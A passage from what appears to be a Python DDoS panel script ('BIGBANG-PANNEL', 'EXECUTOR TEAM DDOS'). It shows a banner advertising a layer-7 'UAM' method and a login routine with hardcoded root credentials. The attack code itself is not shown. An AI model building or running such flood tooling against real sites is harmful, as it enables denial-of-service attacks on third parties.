\033[1;37m                   LAYER-7   : \033[35m[ \033[1;37mUAM \033[35m]
\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
\033[35m           ╚════════════════════════════════════════════════════════╝
""")
			except ValueError:
				main()
			except IndexError:
				main()
                

		
					
 
def login():
    os.system("clear")
    user = "root"
    passwd = "23"
    username = input("""





    
                
                           ⚡ \33[0;32mLOGIN TO BIGBANG-PANNEL : """)
    password = getpass.getpass(prompt="""                  
                           ⚡ \33[0;32mPASSWORDS       : """)
    if username != user or password != passwd:
        print("")
        print(f"""        
                              ☠️ \033[1;31;40mBUY YA SAYANG!!!🚫""")
        time.sleep(0.6)
        sys.exit(1)
    elif username == user and password == passwd:
        print("""                                              
                         ⚡ \33[0;32mWELLCOME TO EXECUTOR TEAM DDOS""")
        time.sleep(0.3)
    menu()
    main()
    

login()